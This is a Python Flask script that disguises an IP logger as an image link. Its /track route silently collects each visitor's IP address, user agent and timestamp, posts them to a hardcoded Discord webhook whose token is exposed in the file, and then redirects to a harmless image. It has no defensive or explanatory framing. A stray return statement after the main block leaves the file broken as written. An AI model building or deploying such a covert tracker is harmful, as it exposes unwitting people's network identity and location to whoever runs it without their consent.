from flask import Flask, request, redirect, make_response
import requests
from datetime import datetime
import os

app = Flask(__name__)

WEBHOOK_URL = "https://discord.com/api/webhooks/1369953205349519380/zAmptjF_CZ3l5xyJ12DOIf3GWQatSNJKepjL_d7r3FL5-QxXhh_msIOjXj4WMEECZjxz"

@app.route('/')
def og_image_preview():

    html = '''
    <html>
      <head>
        <meta property="og:image" content="https://tse2.mm.bing.net/th?id=OIP.rfrxsx6jbbLi1C9fvvaEKwAAAA&pid=Api&P=0&h=180" />
      </head>
      <body style="margin:0; padding:0;">
        <img src="https://tse2.mm.bing.net/th?id=OIP.rfrxsx6jbbLi1C9fvvaEKwAAAA&pid=Api&P=0&h=180" style="width:100vw; height:100vh; object-fit:contain;" />
      </body>
    </html>
    '''
    return make_response(html)

@app.route('/track')
def track_and_redirect():
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    user_agent = request.headers.get('User-Agent')
    timestamp = datetime.utcnow().isoformat()

    data = {
        "embeds": [{
            "color": 0x800080,
            "fields": [
                {"name": "IP", "value": ip, "inline": True},
                {"name": "User-Agent", "value": user_agent[:100] + "...", "inline": False},
                {"name": "Time (UTC)", "value": timestamp, "inline": True}
            ]
        }]
    }

    try:
        requests.post(WEBHOOK_URL, json=data)
    except:
        pass


    return redirect("https://tse2.mm.bing.net/th?id=OIP.rfrxsx6jbbLi1C9fvvaEKwAAAA&pid=Api&P=0&h=180")

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)


    return redirect("https://tse2.mm.bing.net/th?id=OIP.rfrxsx6jbbLi1C9fvvaEKwAAAA&pid=Api&P=0&h=180")
